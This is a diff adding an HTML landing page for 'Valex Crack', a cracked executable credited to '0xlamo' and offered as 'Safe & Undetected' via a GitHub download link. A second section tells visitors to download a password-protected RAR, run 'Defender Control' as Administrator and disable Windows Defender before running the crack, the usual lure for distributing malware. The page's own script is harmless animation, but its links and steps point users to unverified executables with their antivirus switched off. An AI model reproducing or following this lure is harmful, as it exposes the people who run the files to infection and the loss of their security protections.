@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Valex Crack</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* --- الأساسيات --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            background-color: #020202; 
+            color: #ffffff; 
+            font-family: 'Poppins', sans-serif; 
+            line-height: 1.6; 
+            overflow-x: hidden; 
+            min-height: 100vh;
+        }
+
+        #bg-canvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .purple-gradient { 
+            background: linear-gradient(135deg, #bc13fe 0%, #7a1ced 100%); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+        }
+
+        /* --- Navbar --- */
+        nav { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 0 10%; 
+            height: 80px;
+            background: rgba(2, 2, 2, 0.7); 
+            backdrop-filter: blur(20px); 
+            position: fixed; 
+            width: 100%; 
+            top: 0; 
+            z-index: 1000; 
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05); 
+        }
+        
+        .logo { font-size: 24px; font-weight: 700; color: #fff; text-decoration: none; }
+
+        .btn-discord-nav {
+            background: rgba(188, 19, 254, 0.1);
+            border: 1px solid #bc13fe;
+            color: #fff;
+            padding: 8px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-weight: 600;
+        }
+
+        /* --- Content Layout --- */
+        #main-page, #defender-page { width: 100%; }
+
+        .hero { 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            text-align: center; 
+            padding-top: 160px;
+        }
+        
+        .hero h1 { font-size: 64px; font-weight: 700; margin-bottom: 10px; letter-spacing: -1.5px; }
+
+        .products-section { 
+            padding: 40px 10% 100px 10%; 
+            display: flex; 
+            justify-content: center; 
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+
+        .product-card { 
+            background: rgba(10, 10, 10, 0.8); 
+            border: 1px solid rgba(255, 255, 255, 0.05); 
+            border-radius: 24px; 
+            width: 100%;
+            max-width: 500px; 
+            padding: 50px 40px; 
+            text-align: center; 
+            backdrop-filter: blur(15px);
+            transition: 0.4s;
+        }
+
+        .badge { 
+            background: linear-gradient(90deg, rgba(188, 19, 254, 0.2), transparent);
+            border-left: 3px solid #bc13fe;
+            color: #bc13fe; 
+            padding: 5px 15px; 
+            font-size: 11px; 
+            font-weight: 700; 
+            margin-bottom: 25px;
+            display: inline-block;
+        }
+
+        .btn-download {
+            display: inline-block;
+            width: 100%;
+            text-decoration: none;
+            background: linear-gradient(135deg, #bc13fe 0%, #7a1ced 100%);
+            color: white;
+            padding: 16px;
+            border-radius: 12px;
+            font-weight: 700;
+            transition: 0.3s;
+            margin-top: 20px;
+        }
+
+        .guide-link {
+            color: #bc13fe;
+            text-decoration: underline;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        /* --- Defender Page Style --- */
+        #defender-page { display: none; }
+        
+        .instruction-box {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 25px;
+            text-align: left;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .instruction-step {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            font-size: 14px;
+        }
+
+        .step-number {
+            background: #bc13fe;
+            color: #fff;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .pass-box {
+            background: #151515;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px dashed #bc13fe;
+            margin: 15px 0;
+            font-family: monospace;
+            color: #bc13fe;
+            font-size: 18px;
+            text-align: center;
+        }
+
+        /* --- Modal & Footer --- */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(8px);
+        }
+
+        .modal-content {
+            background: #ffffff;
+            color: #000000;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            width: 90%;
+            max-width: 360px;
+        }
+
+        footer { padding: 40px 0; text-align: center; color: #333; font-size: 11px; letter-spacing: 1.5px; }
+    </style>
+</head>
+<body>
+
+    <canvas id="bg-canvas"></canvas>
+
+    <nav>
+        <a href="javascript:void(0)" onclick="showMain()" class="logo">0xlamo</a>
+        <button class="btn-discord-nav" onclick="openModal()">Discord</button>
+    </nav>
+
+    <div id="main-page">
+        <section class="hero">
+            <h1>External Crack by <span class="purple-gradient">0xlamo</span></h1>
+            <p>Enjoy your experience</p>
+        </section>
+
+        <section class="products-section">
+            <div class="product-card">
+                <div class="badge">Safe & Undetected</div>
+                <h2>Valex <span class="purple-gradient">External</span></h2>
+                <p>Do not forget to turn off the protection before running, and if you do not know how to turn off the protection, <span class="guide-link" onclick="showDefender()">Click here</span></p>
+                
+                <a href="https://github.com/9lax/valex-crack/raw/main/Crack%20%20by%20%200xlamo.exe" class="btn-download" download>
+                    Download Now
+                </a>
+            </div>
+        </section>
+    </div>
+
+    <div id="defender-page">
+        <section class="hero">
+            <h1>Protection <span class="purple-gradient">Guide</span></h1>
+            <p>How to use Defender Control</p>
+        </section>
+
+        <section class="products-section">
+            <div class="product-card">
+                <div class="badge">Step 1: Download</div>
+                <h2>Get the Tool</h2>
+                <p>Download the official tool to manage your Windows security settings.</p>
+                
+                <div class="pass-box">Password: sordum</div>
+                
+                <a href="https://github.com/9lax/valex-crack/raw/main/24122024.rar" class="btn-download" download>
+                    Download Defender Control
+                </a>
+                <p style="margin-top: 20px; font-size: 13px; cursor: pointer; text-decoration: underline;" onclick="showMain()">← Back to Valex</p>
+            </div>
+
+            <div class="product-card">
+                <div class="badge">Step 2: Setup</div>
+                <h2>How to Extract & Run</h2>
+                
+                <div class="instruction-box">
+                    <div class="instruction-step">
+                        <div class="step-number">1</div>
+                        <p>Open the downloaded <strong>.rar</strong> file using WinRAR or 7-Zip.</p>
+                    </div>
+                    <div class="instruction-step">
+                        <div class="step-number">2</div>
+                        <p>When asked for a password, type <span style="color:#bc13fe; font-weight:700;">sordum</span> to extract the files.</p>
+                    </div>
+                    <div class="instruction-step">
+                        <div class="step-number">3</div>
+                        <p>Run <strong>dControl.exe</strong> as Administrator.</p>
+                    </div>
+                    <div class="instruction-step">
+                        <div class="step-number">4</div>
+                        <p>Click on <strong style="color:#ff4444;">"Disable Windows Defender"</strong> and wait for the shield icon to turn Red.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <div id="discordModal" class="modal" onclick="closeModal(event)">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <h3 style="font-size: 22px; font-weight: 700;">Support</h3>
+            <p style="color: #777; font-size: 13px; margin-top: 4px;">Click the box to copy username</p>
+            <div style="background: #f8f8f8; padding: 12px; border-radius: 10px; margin: 20px 0; font-size: 22px; font-weight: 700; cursor: pointer;" onclick="copyUser()">0tlp</div>
+            <p id="copy-status" style="font-size: 11px; color: #999;">Ready to copy</p>
+            <p style="margin-top: 15px; color: #aaa; cursor: pointer; font-size: 13px;" onclick="closeModal()">Dismiss</p>
+        </div>
+    </div>
+
+    <footer>
+        © 2026 VALEX CRACK
+    </footer>
+
+    <script>
+        function showDefender() {
+            document.getElementById('main-page').style.display = 'none';
+            document.getElementById('defender-page').style.display = 'block';
+            window.scrollTo(0,0);
+        }
+        function showMain() {
+            document.getElementById('defender-page').style.display = 'none';
+            document.getElementById('main-page').style.display = 'block';
+            window.scrollTo(0,0);
+        }
+        function openModal() { document.getElementById('discordModal').style.display = 'flex'; }
+        function closeModal() { document.getElementById('discordModal').style.display = 'none'; }
+        function copyUser() {
+            navigator.clipboard.writeText("0tlp");
+            document.getElementById('copy-status').innerText = "COPIED!";
+            setTimeout(() => { document.getElementById('copy-status').innerText = "Ready to copy"; }, 2000);
+        }
+
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        let particlesArray = [];
+        class Particle {
+            constructor(x, y, directionX, directionY, size) {
+                this.x = x; this.y = y; this.directionX = directionX;
+                this.directionY = directionY; this.size = size;
+            }
+            draw() {
+                ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2, false);
+                ctx.fillStyle = 'rgba(188, 19, 254, 0.3)'; ctx.fill();
+            }
+            update() {
+                if (this.x > canvas.width || this.x < 0) this.directionX = -this.directionX;
+                if (this.y > canvas.height || this.y < 0) this.directionY = -this.directionY;
+                this.x += this.directionX; this.y += this.directionY; this.draw();
+            }
+        }
+        function init() {
+            particlesArray = [];
+            let n = (canvas.height * canvas.width) / 20000;
+            for (let i = 0; i < n; i++) {
+                particlesArray.push(new Particle(Math.random()*canvas.width, Math.random()*canvas.height, (Math.random()*0.6)-0.3, (Math.random()*0.6)-0.3, (Math.random()*1.5)+0.5));
+            }
+        }
+        function animate() { requestAnimationFrame(animate); ctx.clearRect(0,0,canvas.width,canvas.height); particlesArray.forEach(p => p.update()); }
+        init(); animate();
+        window.onresize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; init(); };
+    </script>
+</body>
+</html>
